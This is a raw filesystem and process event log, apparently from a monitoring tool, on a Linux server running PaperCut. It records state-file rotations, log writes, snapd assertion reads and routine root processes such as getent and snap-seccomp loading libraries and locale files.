2026/03/21 06:45:34 FS:          CLOSE_WRITE | /home/papercut/server/data/internal/state/systemstate/user-client-data.new.ser
2026/03/21 06:45:34 FS:               DELETE | /home/papercut/server/data/internal/state/systemstate/user-client-data.curr.ser
2026/03/21 06:45:34 FS:           MOVED_FROM | /home/papercut/server/data/internal/state/systemstate/user-client-data.new.ser
2026/03/21 06:45:34 FS:             MOVED_TO | /home/papercut/server/data/internal/state/systemstate/user-client-data.curr.ser
2026/03/21 06:45:34 FS:               CREATE | /home/papercut/server/data/internal/state/systemstate/script-state.new.ser
2026/03/21 06:45:34 FS:                 OPEN | /home/papercut/server/data/internal/state/systemstate/script-state.new.ser
2026/03/21 06:45:34 FS:               MODIFY | /home/papercut/server/data/internal/state/systemstate/script-state.new.ser
2026/03/21 06:45:34 FS:          CLOSE_WRITE | /home/papercut/server/data/internal/state/systemstate/script-state.new.ser
2026/03/21 06:45:34 FS:               DELETE | /home/papercut/server/data/internal/state/systemstate/script-state.curr.ser
2026/03/21 06:45:34 FS:           MOVED_FROM | /home/papercut/server/data/internal/state/systemstate/script-state.new.ser
2026/03/21 06:45:34 FS:             MOVED_TO | /home/papercut/server/data/internal/state/systemstate/script-state.curr.ser
2026/03/21 06:45:34 FS:               CREATE | /home/papercut/server/data/internal/state/systemstate/held-jobs.new.ser
2026/03/21 06:45:34 FS:                 OPEN | /home/papercut/server/data/internal/state/systemstate/held-jobs.new.ser
2026/03/21 06:45:34 FS:               MODIFY | /home/papercut/server/data/internal/state/systemstate/held-jobs.new.ser
2026/03/21 06:45:34 FS:          CLOSE_WRITE | /home/papercut/server/data/internal/state/systemstate/held-jobs.new.ser
2026/03/21 06:45:34 FS:               DELETE | /home/papercut/server/data/internal/state/systemstate/held-jobs.curr.ser
2026/03/21 06:45:34 FS:           MOVED_FROM | /home/papercut/server/data/internal/state/systemstate/held-jobs.new.ser
2026/03/21 06:45:34 FS:             MOVED_TO | /home/papercut/server/data/internal/state/systemstate/held-jobs.curr.ser
2026/03/21 06:45:34 FS:               CREATE | /home/papercut/server/data/internal/state/systemstate/web-print.new.ser
2026/03/21 06:45:34 FS:                 OPEN | /home/papercut/server/data/internal/state/systemstate/web-print.new.ser
2026/03/21 06:45:34 FS:               MODIFY | /home/papercut/server/data/internal/state/systemstate/web-print.new.ser
2026/03/21 06:45:34 FS:          CLOSE_WRITE | /home/papercut/server/data/internal/state/systemstate/web-print.new.ser
2026/03/21 06:45:34 FS:               DELETE | /home/papercut/server/data/internal/state/systemstate/web-print.curr.ser
2026/03/21 06:45:34 FS:           MOVED_FROM | /home/papercut/server/data/internal/state/systemstate/web-print.new.ser
2026/03/21 06:45:34 FS:             MOVED_TO | /home/papercut/server/data/internal/state/systemstate/web-print.curr.ser
2026/03/21 06:45:34 FS:               CREATE | /home/papercut/server/data/internal/state/systemstate/device-txns.new.ser
2026/03/21 06:45:34 FS:                 OPEN | /home/papercut/server/data/internal/state/systemstate/device-txns.new.ser
2026/03/21 06:45:34 FS:               MODIFY | /home/papercut/server/data/internal/state/systemstate/device-txns.new.ser
2026/03/21 06:45:34 FS:          CLOSE_WRITE | /home/papercut/server/data/internal/state/systemstate/device-txns.new.ser
2026/03/21 06:45:34 FS:               DELETE | /home/papercut/server/data/internal/state/systemstate/device-txns.curr.ser
2026/03/21 06:45:34 FS:           MOVED_FROM | /home/papercut/server/data/internal/state/systemstate/device-txns.new.ser
2026/03/21 06:45:34 FS:             MOVED_TO | /home/papercut/server/data/internal/state/systemstate/device-txns.curr.ser
2026/03/21 06:45:34 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:34 FS:               MODIFY | /var/log/laurel/audit.log
2026/03/21 06:45:34 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:34 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:35 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:35 FS:               MODIFY | /var/log/laurel/audit.log
2026/03/21 06:45:35 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:35 FS:               MODIFY | /var/log/laurel/audit.log
2026/03/21 06:45:36 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:36 FS:               MODIFY | /var/log/laurel/audit.log
2026/03/21 06:45:37 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:37 FS:             OPEN DIR | /home/papercut/server
2026/03/21 06:45:37 FS:             OPEN DIR | /home/papercut/server/
2026/03/21 06:45:37 FS:           ACCESS DIR | /home/papercut/server
2026/03/21 06:45:37 FS:           ACCESS DIR | /home/papercut/server/
2026/03/21 06:45:37 FS:           ACCESS DIR | /home/papercut/server
2026/03/21 06:45:37 FS:           ACCESS DIR | /home/papercut/server/
2026/03/21 06:45:37 FS:    CLOSE_NOWRITE DIR | /home/papercut/server
2026/03/21 06:45:37 FS:    CLOSE_NOWRITE DIR | /home/papercut/server/
2026/03/21 06:45:37 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:37 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:38 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:38 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:38 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:38 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:38 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:38 FS:               MODIFY | /var/log/laurel/audit.log
2026/03/21 06:45:38 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:38 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:38 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:39 FS:               MODIFY | /var/log/laurel/audit.log
2026/03/21 06:45:39 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:40 FS:               MODIFY | /var/log/laurel/audit.log
2026/03/21 06:45:40 FS:               MODIFY | /home/papercut/server/logs/gc.log
2026/03/21 06:45:40 FS:               MODIFY | /home/papercut/server/logs/gc.log
2026/03/21 06:45:40 FS:               CREATE | /home/papercut/server/data/internal/state/systemstate/job-authentication.new.ser
2026/03/21 06:45:40 FS:                 OPEN | /home/papercut/server/data/internal/state/systemstate/job-authentication.new.ser
2026/03/21 06:45:40 FS:               MODIFY | /home/papercut/server/data/internal/state/systemstate/job-authentication.new.ser
2026/03/21 06:45:40 FS:          CLOSE_WRITE | /home/papercut/server/data/internal/state/systemstate/job-authentication.new.ser
2026/03/21 06:45:40 FS:               DELETE | /home/papercut/server/data/internal/state/systemstate/job-authentication.curr.ser
2026/03/21 06:45:40 FS:           MOVED_FROM | /home/papercut/server/data/internal/state/systemstate/job-authentication.new.ser
2026/03/21 06:45:40 FS:             MOVED_TO | /home/papercut/server/data/internal/state/systemstate/job-authentication.curr.ser
2026/03/21 06:45:40 FS:               CREATE | /home/papercut/server/data/internal/state/systemstate/user-client-data.new.ser
2026/03/21 06:45:40 FS:                 OPEN | /home/papercut/server/data/internal/state/systemstate/user-client-data.new.ser
2026/03/21 06:45:40 FS:               MODIFY | /home/papercut/server/data/internal/state/systemstate/user-client-data.new.ser
2026/03/21 06:45:40 FS:          CLOSE_WRITE | /home/papercut/server/data/internal/state/systemstate/user-client-data.new.ser
2026/03/21 06:45:40 FS:               DELETE | /home/papercut/server/data/internal/state/systemstate/user-client-data.curr.ser
2026/03/21 06:45:40 FS:           MOVED_FROM | /home/papercut/server/data/internal/state/systemstate/user-client-data.new.ser
2026/03/21 06:45:40 FS:             MOVED_TO | /home/papercut/server/data/internal/state/systemstate/user-client-data.curr.ser
2026/03/21 06:45:40 FS:               CREATE | /home/papercut/server/data/internal/state/systemstate/script-state.new.ser
2026/03/21 06:45:40 FS:                 OPEN | /home/papercut/server/data/internal/state/systemstate/script-state.new.ser
2026/03/21 06:45:40 FS:               MODIFY | /home/papercut/server/data/internal/state/systemstate/script-state.new.ser
2026/03/21 06:45:40 FS:          CLOSE_WRITE | /home/papercut/server/data/internal/state/systemstate/script-state.new.ser
2026/03/21 06:45:40 FS:               DELETE | /home/papercut/server/data/internal/state/systemstate/script-state.curr.ser
2026/03/21 06:45:40 FS:           MOVED_FROM | /home/papercut/server/data/internal/state/systemstate/script-state.new.ser
2026/03/21 06:45:40 FS:             MOVED_TO | /home/papercut/server/data/internal/state/systemstate/script-state.curr.ser
2026/03/21 06:45:40 FS:               CREATE | /home/papercut/server/data/internal/state/systemstate/held-jobs.new.ser
2026/03/21 06:45:40 FS:                 OPEN | /home/papercut/server/data/internal/state/systemstate/held-jobs.new.ser
2026/03/21 06:45:40 FS:               MODIFY | /home/papercut/server/data/internal/state/systemstate/held-jobs.new.ser
2026/03/21 06:45:40 FS:          CLOSE_WRITE | /home/papercut/server/data/internal/state/systemstate/held-jobs.new.ser
2026/03/21 06:45:40 FS:               DELETE | /home/papercut/server/data/internal/state/systemstate/held-jobs.curr.ser
2026/03/21 06:45:40 FS:           MOVED_FROM | /home/papercut/server/data/internal/state/systemstate/held-jobs.new.ser
2026/03/21 06:45:40 FS:             MOVED_TO | /home/papercut/server/data/internal/state/systemstate/held-jobs.curr.ser
2026/03/21 06:45:40 FS:               CREATE | /home/papercut/server/data/internal/state/systemstate/web-print.new.ser
2026/03/21 06:45:40 FS:                 OPEN | /home/papercut/server/data/internal/state/systemstate/web-print.new.ser
2026/03/21 06:45:40 FS:               MODIFY | /home/papercut/server/data/internal/state/systemstate/web-print.new.ser
2026/03/21 06:45:40 FS:          CLOSE_WRITE | /home/papercut/server/data/internal/state/systemstate/web-print.new.ser
2026/03/21 06:45:40 FS:               DELETE | /home/papercut/server/data/internal/state/systemstate/web-print.curr.ser
2026/03/21 06:45:40 FS:           MOVED_FROM | /home/papercut/server/data/internal/state/systemstate/web-print.new.ser
2026/03/21 06:45:40 FS:             MOVED_TO | /home/papercut/server/data/internal/state/systemstate/web-print.curr.ser
2026/03/21 06:45:40 FS:               CREATE | /home/papercut/server/data/internal/state/systemstate/device-txns.new.ser
2026/03/21 06:45:40 FS:                 OPEN | /home/papercut/server/data/internal/state/systemstate/device-txns.new.ser
2026/03/21 06:45:40 FS:               MODIFY | /home/papercut/server/data/internal/state/systemstate/device-txns.new.ser
2026/03/21 06:45:40 FS:          CLOSE_WRITE | /home/papercut/server/data/internal/state/systemstate/device-txns.new.ser
2026/03/21 06:45:40 FS:               DELETE | /home/papercut/server/data/internal/state/systemstate/device-txns.curr.ser
2026/03/21 06:45:40 FS:           MOVED_FROM | /home/papercut/server/data/internal/state/systemstate/device-txns.new.ser
2026/03/21 06:45:40 FS:             MOVED_TO | /home/papercut/server/data/internal/state/systemstate/device-txns.curr.ser
2026/03/21 06:45:40 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:41 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:41 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:41 FS:               MODIFY | /var/log/laurel/audit.log
2026/03/21 06:45:41 FS:             OPEN DIR | /var/lib/snapd/assertions/asserts-v0/model/16/canonical/aws-classic
2026/03/21 06:45:41 FS:             OPEN DIR | /var/lib/snapd/assertions/asserts-v0/model/16/canonical/aws-classic/
2026/03/21 06:45:41 FS:           ACCESS DIR | /var/lib/snapd/assertions/asserts-v0/model/16/canonical/aws-classic
2026/03/21 06:45:41 FS:           ACCESS DIR | /var/lib/snapd/assertions/asserts-v0/model/16/canonical/aws-classic/
2026/03/21 06:45:41 FS:           ACCESS DIR | /var/lib/snapd/assertions/asserts-v0/model/16/canonical/aws-classic
2026/03/21 06:45:41 FS:           ACCESS DIR | /var/lib/snapd/assertions/asserts-v0/model/16/canonical/aws-classic/
2026/03/21 06:45:41 FS:                 OPEN | /var/lib/snapd/assertions/asserts-v0/model/16/canonical/aws-classic/active
2026/03/21 06:45:41 FS:               ACCESS | /var/lib/snapd/assertions/asserts-v0/model/16/canonical/aws-classic/active
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /var/lib/snapd/assertions/asserts-v0/model/16/canonical/aws-classic/active
2026/03/21 06:45:41 FS:    CLOSE_NOWRITE DIR | /var/lib/snapd/assertions/asserts-v0/model/16/canonical/aws-classic
2026/03/21 06:45:41 FS:    CLOSE_NOWRITE DIR | /var/lib/snapd/assertions/asserts-v0/model/16/canonical/aws-classic/
2026/03/21 06:45:41 FS:             OPEN DIR | /var/lib/snapd/assertions/asserts-v0/serial/canonical/aws-classic/73f00c1b-11f4-47dc-8422-f87cb7e222f9
2026/03/21 06:45:41 FS:             OPEN DIR | /var/lib/snapd/assertions/asserts-v0/serial/canonical/aws-classic/73f00c1b-11f4-47dc-8422-f87cb7e222f9/
2026/03/21 06:45:41 FS:           ACCESS DIR | /var/lib/snapd/assertions/asserts-v0/serial/canonical/aws-classic/73f00c1b-11f4-47dc-8422-f87cb7e222f9
2026/03/21 06:45:41 FS:           ACCESS DIR | /var/lib/snapd/assertions/asserts-v0/serial/canonical/aws-classic/73f00c1b-11f4-47dc-8422-f87cb7e222f9/
2026/03/21 06:45:41 FS:           ACCESS DIR | /var/lib/snapd/assertions/asserts-v0/serial/canonical/aws-classic/73f00c1b-11f4-47dc-8422-f87cb7e222f9
2026/03/21 06:45:41 FS:           ACCESS DIR | /var/lib/snapd/assertions/asserts-v0/serial/canonical/aws-classic/73f00c1b-11f4-47dc-8422-f87cb7e222f9/
2026/03/21 06:45:41 FS:                 OPEN | /var/lib/snapd/assertions/asserts-v0/serial/canonical/aws-classic/73f00c1b-11f4-47dc-8422-f87cb7e222f9/active
2026/03/21 06:45:41 FS:               ACCESS | /var/lib/snapd/assertions/asserts-v0/serial/canonical/aws-classic/73f00c1b-11f4-47dc-8422-f87cb7e222f9/active
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /var/lib/snapd/assertions/asserts-v0/serial/canonical/aws-classic/73f00c1b-11f4-47dc-8422-f87cb7e222f9/active
2026/03/21 06:45:41 FS:    CLOSE_NOWRITE DIR | /var/lib/snapd/assertions/asserts-v0/serial/canonical/aws-classic/73f00c1b-11f4-47dc-8422-f87cb7e222f9
2026/03/21 06:45:41 FS:    CLOSE_NOWRITE DIR | /var/lib/snapd/assertions/asserts-v0/serial/canonical/aws-classic/73f00c1b-11f4-47dc-8422-f87cb7e222f9/
2026/03/21 06:45:41 FS:               MODIFY | /var/log/laurel/audit.log
2026/03/21 06:45:41 FS:             OPEN DIR | /var/lib/snapd/assertions/asserts-v0/model/16/canonical/aws-classic
2026/03/21 06:45:41 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:41 FS:             OPEN DIR | /var/lib/snapd/assertions/asserts-v0/model/16/canonical/aws-classic/
2026/03/21 06:45:41 FS:           ACCESS DIR | /var/lib/snapd/assertions/asserts-v0/model/16/canonical/aws-classic
2026/03/21 06:45:41 FS:           ACCESS DIR | /var/lib/snapd/assertions/asserts-v0/model/16/canonical/aws-classic/
2026/03/21 06:45:41 FS:           ACCESS DIR | /var/lib/snapd/assertions/asserts-v0/model/16/canonical/aws-classic
2026/03/21 06:45:41 FS:           ACCESS DIR | /var/lib/snapd/assertions/asserts-v0/model/16/canonical/aws-classic/
2026/03/21 06:45:41 FS:                 OPEN | /var/lib/snapd/assertions/asserts-v0/model/16/canonical/aws-classic/active
2026/03/21 06:45:41 FS:               ACCESS | /var/lib/snapd/assertions/asserts-v0/model/16/canonical/aws-classic/active
2026/03/21 06:45:41 FS:                 OPEN | /etc/environment
2026/03/21 06:45:41 FS:               ACCESS | /etc/environment
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /etc/environment
2026/03/21 06:45:41 CMD: UID=0     PID=33330  | /sbin/init 
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /var/lib/snapd/assertions/asserts-v0/model/16/canonical/aws-classic/active
2026/03/21 06:45:41 FS:    CLOSE_NOWRITE DIR | /var/lib/snapd/assertions/asserts-v0/model/16/canonical/aws-classic
2026/03/21 06:45:41 FS:    CLOSE_NOWRITE DIR | /var/lib/snapd/assertions/asserts-v0/model/16/canonical/aws-classic/
2026/03/21 06:45:41 FS:             OPEN DIR | /var/lib/snapd/assertions/asserts-v0/serial/canonical/aws-classic/73f00c1b-11f4-47dc-8422-f87cb7e222f9
2026/03/21 06:45:41 FS:             OPEN DIR | /var/lib/snapd/assertions/asserts-v0/serial/canonical/aws-classic/73f00c1b-11f4-47dc-8422-f87cb7e222f9/
2026/03/21 06:45:41 FS:           ACCESS DIR | /var/lib/snapd/assertions/asserts-v0/serial/canonical/aws-classic/73f00c1b-11f4-47dc-8422-f87cb7e222f9
2026/03/21 06:45:41 FS:           ACCESS DIR | /var/lib/snapd/assertions/asserts-v0/serial/canonical/aws-classic/73f00c1b-11f4-47dc-8422-f87cb7e222f9/
2026/03/21 06:45:41 FS:           ACCESS DIR | /var/lib/snapd/assertions/asserts-v0/serial/canonical/aws-classic/73f00c1b-11f4-47dc-8422-f87cb7e222f9
2026/03/21 06:45:41 FS:           ACCESS DIR | /var/lib/snapd/assertions/asserts-v0/serial/canonical/aws-classic/73f00c1b-11f4-47dc-8422-f87cb7e222f9/
2026/03/21 06:45:41 FS:                 OPEN | /var/lib/snapd/assertions/asserts-v0/serial/canonical/aws-classic/73f00c1b-11f4-47dc-8422-f87cb7e222f9/active
2026/03/21 06:45:41 FS:               ACCESS | /var/lib/snapd/assertions/asserts-v0/serial/canonical/aws-classic/73f00c1b-11f4-47dc-8422-f87cb7e222f9/active
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /var/lib/snapd/assertions/asserts-v0/serial/canonical/aws-classic/73f00c1b-11f4-47dc-8422-f87cb7e222f9/active
2026/03/21 06:45:41 FS:    CLOSE_NOWRITE DIR | /var/lib/snapd/assertions/asserts-v0/serial/canonical/aws-classic/73f00c1b-11f4-47dc-8422-f87cb7e222f9
2026/03/21 06:45:41 FS:    CLOSE_NOWRITE DIR | /var/lib/snapd/assertions/asserts-v0/serial/canonical/aws-classic/73f00c1b-11f4-47dc-8422-f87cb7e222f9/
2026/03/21 06:45:41 FS:             OPEN DIR | /var/lib/snapd/assertions/asserts-v0/model/16/canonical/aws-classic
2026/03/21 06:45:41 FS:             OPEN DIR | /var/lib/snapd/assertions/asserts-v0/model/16/canonical/aws-classic/
2026/03/21 06:45:41 FS:           ACCESS DIR | /var/lib/snapd/assertions/asserts-v0/model/16/canonical/aws-classic
2026/03/21 06:45:41 FS:           ACCESS DIR | /var/lib/snapd/assertions/asserts-v0/model/16/canonical/aws-classic/
2026/03/21 06:45:41 FS:           ACCESS DIR | /var/lib/snapd/assertions/asserts-v0/model/16/canonical/aws-classic
2026/03/21 06:45:41 FS:           ACCESS DIR | /var/lib/snapd/assertions/asserts-v0/model/16/canonical/aws-classic/
2026/03/21 06:45:41 FS:                 OPEN | /var/lib/snapd/assertions/asserts-v0/model/16/canonical/aws-classic/active
2026/03/21 06:45:41 FS:               ACCESS | /var/lib/snapd/assertions/asserts-v0/model/16/canonical/aws-classic/active
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /var/lib/snapd/assertions/asserts-v0/model/16/canonical/aws-classic/active
2026/03/21 06:45:41 FS:    CLOSE_NOWRITE DIR | /var/lib/snapd/assertions/asserts-v0/model/16/canonical/aws-classic
2026/03/21 06:45:41 FS:    CLOSE_NOWRITE DIR | /var/lib/snapd/assertions/asserts-v0/model/16/canonical/aws-classic/
2026/03/21 06:45:41 FS:                 OPEN | /usr/bin/snap
2026/03/21 06:45:41 FS:               ACCESS | /usr/bin/snap
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
2026/03/21 06:45:41 FS:               ACCESS | /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
2026/03/21 06:45:41 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:41 FS:               MODIFY | /var/log/laurel/audit.log
2026/03/21 06:45:41 FS:                 OPEN | /etc/ld.so.cache
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/libc.so.6
2026/03/21 06:45:41 FS:               ACCESS | /usr/lib/x86_64-linux-gnu/libc.so.6
2026/03/21 06:45:41 FS:               MODIFY | /var/log/laurel/audit.log
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /etc/ld.so.cache
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/os-release
2026/03/21 06:45:41 FS:               ACCESS | /usr/lib/os-release
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/os-release
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/bin/snap
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/x86_64-linux-gnu/libc.so.6
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/os-release
2026/03/21 06:45:41 FS:               ACCESS | /usr/lib/os-release
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/os-release
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/snapd/info
2026/03/21 06:45:41 FS:               ACCESS | /usr/lib/snapd/info
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/snapd/info
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/snapd/info
2026/03/21 06:45:41 FS:               ACCESS | /usr/lib/snapd/info
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/snapd/info
2026/03/21 06:45:41 FS:                 OPEN | /etc/fstab
2026/03/21 06:45:41 FS:               ACCESS | /etc/fstab
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /etc/fstab
2026/03/21 06:45:41 CMD: UID=0     PID=33341  | /snap/snapd/25202/usr/lib/snapd/snap-seccomp version-info 
2026/03/21 06:45:41 FS:                 OPEN | /var/lib/snapd/system-key
2026/03/21 06:45:41 FS:               ACCESS | /var/lib/snapd/system-key
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /var/lib/snapd/system-key
2026/03/21 06:45:41 FS:                 OPEN | /var/lib/snapd/inhibit/amazon-ssm-agent.lock
2026/03/21 06:45:41 FS:                 OPEN | /var/lib/snapd/sequence/amazon-ssm-agent.json
2026/03/21 06:45:41 FS:               ACCESS | /var/lib/snapd/sequence/amazon-ssm-agent.json
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /var/lib/snapd/sequence/amazon-ssm-agent.json
2026/03/21 06:45:41 CMD: UID=0     PID=33346  | /usr/bin/getent passwd 0 
2026/03/21 06:45:41 FS:                 OPEN | /usr/bin/getent
2026/03/21 06:45:41 FS:               ACCESS | /usr/bin/getent
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
2026/03/21 06:45:41 FS:               ACCESS | /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
2026/03/21 06:45:41 FS:                 OPEN | /etc/ld.so.cache
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/libc.so.6
2026/03/21 06:45:41 FS:               ACCESS | /usr/lib/x86_64-linux-gnu/libc.so.6
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /etc/ld.so.cache
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/locale/locale-archive
2026/03/21 06:45:41 FS:                 OPEN | /etc/locale.alias
2026/03/21 06:45:41 FS:               ACCESS | /etc/locale.alias
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /etc/locale.alias
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_IDENTIFICATION
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_MEASUREMENT
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_TELEPHONE
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_ADDRESS
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_NAME
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_PAPER
2026/03/21 06:45:41 FS:             OPEN DIR | /usr/lib/locale/C.utf8/LC_MESSAGES
2026/03/21 06:45:41 FS:             OPEN DIR | /usr/lib/locale/C.utf8/LC_MESSAGES/
2026/03/21 06:45:41 FS:    CLOSE_NOWRITE DIR | /usr/lib/locale/C.utf8/LC_MESSAGES
2026/03/21 06:45:41 FS:    CLOSE_NOWRITE DIR | /usr/lib/locale/C.utf8/LC_MESSAGES/
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_MESSAGES/SYS_LC_MESSAGES
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_MONETARY
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_COLLATE
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_TIME
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_NUMERIC
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_CTYPE
2026/03/21 06:45:41 FS:                 OPEN | /etc/nsswitch.conf
2026/03/21 06:45:41 FS:               ACCESS | /etc/nsswitch.conf
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /etc/nsswitch.conf
2026/03/21 06:45:41 FS:                 OPEN | /etc/passwd
2026/03/21 06:45:41 FS:               ACCESS | /etc/passwd
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /etc/passwd
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/bin/getent
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_IDENTIFICATION
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_MEASUREMENT
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_TELEPHONE
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_ADDRESS
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_NAME
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_PAPER
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_MESSAGES/SYS_LC_MESSAGES
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_MONETARY
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_COLLATE
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_TIME
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_NUMERIC
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_CTYPE
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/x86_64-linux-gnu/libc.so.6
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
2026/03/21 06:45:41 FS:                 OPEN | /usr/bin/getent
2026/03/21 06:45:41 CMD: UID=0     PID=33347  | /usr/bin/getent passwd 0 
2026/03/21 06:45:41 FS:               ACCESS | /usr/bin/getent
2026/03/21 06:45:41 FS:               ACCESS | /usr/bin/getent
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
2026/03/21 06:45:41 FS:               ACCESS | /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
2026/03/21 06:45:41 FS:                 OPEN | /etc/ld.so.cache
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/libc.so.6
2026/03/21 06:45:41 FS:               ACCESS | /usr/lib/x86_64-linux-gnu/libc.so.6
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /etc/ld.so.cache
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/locale/locale-archive
2026/03/21 06:45:41 FS:                 OPEN | /etc/locale.alias
2026/03/21 06:45:41 FS:               ACCESS | /etc/locale.alias
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /etc/locale.alias
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_IDENTIFICATION
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_MEASUREMENT
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_TELEPHONE
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_ADDRESS
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_NAME
